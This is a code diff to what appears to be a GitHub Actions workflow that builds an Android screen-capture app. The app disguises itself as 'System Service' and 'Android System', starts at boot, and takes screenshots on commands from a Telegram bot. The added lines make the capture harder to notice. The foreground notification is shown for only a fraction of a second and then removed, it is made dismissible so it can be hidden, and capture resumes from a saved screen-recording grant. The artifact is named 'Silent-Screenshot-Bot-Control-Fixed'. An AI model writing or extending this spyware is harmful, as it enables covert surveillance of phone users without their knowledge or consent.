@@ -44,8 +44,8 @@ jobs:
                   applicationId "com.lan.screenshare"
                   minSdk 26
                   targetSdk 34
-                  versionCode 11
-                  versionName "3.3-telegram-bot"
+                  versionCode 12
+                  versionName "3.4-telegram-bot"
               }
               compileOptions {
                   sourceCompatibility JavaVersion.VERSION_17
@@ -62,13 +62,13 @@ jobs:
 
               <uses-permission android:name="android.permission.INTERNET" />
               <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-              <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
               <uses-permission android:name="android.permission.WAKE_LOCK" />
               <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
               <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
               <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+              <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
 
               <application
                   android:label="System Service"
@@ -404,6 +404,7 @@ jobs:
               private var stopRequested = false
               private var lockReceiverRegistered = false
               private var pollingThread: Thread? = null
+              private var autoThread: Thread? = null
               private var lastUpdateId = 0L
 
               private val projCallback = object : MediaProjection.Callback() {
@@ -504,7 +505,8 @@ jobs:
               }
 
               private fun startAutoLoop() {
-                  thread(name = "AutoLoop") {
+                  if (autoThread?.isAlive == true) return
+                  autoThread = thread(name = "AutoLoop") {
                       while (isCapturing && !stopRequested) {
                           val shouldCapture = !userPaused && isPhoneUsable()
                           if (shouldCapture) {
@@ -580,8 +582,16 @@ jobs:
                   when (command) {
                       "/start" -> {
                           userPaused = false
-                          isCapturing = true
-                          sendTelegramMsg("▶️ تم تفعيل الالتقاط التلقائي.")
+                          if (!isCapturing) {
+                              if (savedData != null) {
+                                  startProjection(savedResultCode, savedData!!)
+                                  sendTelegramMsg("▶️ تم تفعيل الالتقاط التلقائي (تم استئناف الجلسة).")
+                              } else {
+                                  sendTelegramMsg("⚠️ يرجى فتح التطبيق ومنح إذن الشاشة أولاً.")
+                              }
+                          } else {
+                              sendTelegramMsg("▶️ تم تفعيل الالتقاط التلقائي.")
+                          }
                       }
                       "/stop" -> {
                           userPaused = true
@@ -684,6 +694,11 @@ jobs:
                   var vd: VirtualDisplay? = null
                   var ir: ImageReader? = null
                   try {
+                      // إظهار الإشعار لجزء من الثانية
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                          startForeground(1, buildNotification("جاري الالتقاط..."), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
+                      }
+
                       val metrics = resources.displayMetrics
                       val w = 480
                       var h = (metrics.heightPixels * (480f / metrics.widthPixels)).toInt()
@@ -724,6 +739,12 @@ jobs:
                           finalBmp.compress(fmt, 55, out)
                           if (finalBmp !== bmp) finalBmp.recycle()
                           bmp.recycle()
+                          
+                          // إخفاء الإشعار بعد الالتقاط
+                          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                              stopForeground(STOP_FOREGROUND_REMOVE)
+                          }
+                          
                           return out.toByteArray()
                       } finally {
                           img.close()
@@ -898,7 +919,7 @@ jobs:
                   out.flush()
               }
 
-              private fun createNotification(text: String) {
+              private fun buildNotification(text: String): Notification {
                   val chanId = "sys_min"
                   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                       val chan = NotificationChannel(chanId, "Android System", NotificationManager.IMPORTANCE_MIN).apply {
@@ -917,17 +938,20 @@ jobs:
                       PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
                   )
 
-                  val notif = Notification.Builder(this, chanId)
+                  return Notification.Builder(this, chanId)
                       .setContentTitle("Android System")
-                      .setContentText("System service running")
+                      .setContentText(text)
                       .setSmallIcon(android.R.drawable.stat_sys_download_done)
                       .setContentIntent(pending)
-                      .setOngoing(true)
+                      .setOngoing(false) // تم تعديلها إلى false لتسمح بالإخفاء
                       .setPriority(Notification.PRIORITY_MIN)
                       .setCategory(Notification.CATEGORY_SERVICE)
                       .setVisibility(Notification.VISIBILITY_SECRET)
                       .build()
+              }
 
+              private fun createNotification(text: String) {
+                  val notif = buildNotification(text)
                   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                       startForeground(1, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                   } else {
@@ -952,6 +976,7 @@ jobs:
                   stopRequested = true
                   unregisterLockReceiver()
                   try { pollingThread?.interrupt() } catch (_: Throwable) {}
+                  try { autoThread?.interrupt() } catch (_: Throwable) {}
                   try { projection?.unregisterCallback(projCallback) } catch (_: Throwable) {}
                   try { projection?.stop() } catch (_: Throwable) {}
                   try { serverSocket?.close() } catch (_: Throwable) {}
@@ -1010,5 +1035,5 @@ jobs:
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: Silent-Screenshot-Bot-Control
+          name: Silent-Screenshot-Bot-Control-Fixed
           path: app/build/outputs/apk/debug/app-debug.apk
